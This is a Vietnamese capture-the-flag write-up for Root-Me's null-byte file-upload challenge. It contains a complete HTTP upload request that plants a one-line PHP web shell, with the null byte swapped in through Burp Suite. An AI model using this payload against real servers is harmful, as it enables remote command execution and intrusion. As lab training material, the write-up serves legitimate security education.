<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-fileupload/fileupload_chall3" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    File upload - nullbyte
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Gallery v0.04</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Your goal is to hack this photo galery by uploading PHP code.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h2 id="Nullbyte-injection"><a href="#Nullbyte-injection" class="headerlink" title="Nullbyte injection"></a>Nullbyte injection</h2>
                <p>Như đã nói ở những bài lý thuyết trước, null byte giúp kẻ tấn công bỏ đi những phần sau của string trong filename shell.php%00.txt, dù lúc kiểm tra thì vẫn cắt ra thì đuôi là .txt, nhưng khi lưu vào thì phần %00.txt bị bỏ qua.<br>Do đó file php được upload.</p>
                <h2 id="Loi-do-phien-ban-PHP-cu-5-3-4-before"><a href="#Loi-do-phien-ban-PHP-cu-5-3-4-before" class="headerlink" title="Lỗi do phiên bản PHP cũ: 5.3.4 before."></a>Lỗi do phiên bản PHP cũ: 5.3.4 before.</h2>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">POST /web-serveur/ch22/?action=upload HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------148573195313022</span><br><span class="line">Content-Length: 235</span><br><span class="line">Referer: http://challenge01.root-me.org/web-serveur/ch22/?action=upload</span><br><span class="line">Cookie: PHPSESSID=9t16meg7hv6q2533qn17ep0vf6; uid=wKgbZFv4QW6xlBVADqNpAg==</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------148573195313022</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"shell.phpA.png"</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php system(_<span class="variable">$GET</span>[<span class="string">'cmd'</span>]); ?&gt;</span><br><span class="line">-----------------------------148573195313022--</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dùng mode hex ở Burp Suite để chuyển từ mã 41 của kí tự A sang 00</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <h2 id="Con-lai-giong-bai-truoc"><a href="#Con-lai-giong-bai-truoc" class="headerlink" title="Còn lại giống bài trước."></a>Còn lại giống bài trước.</h2>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>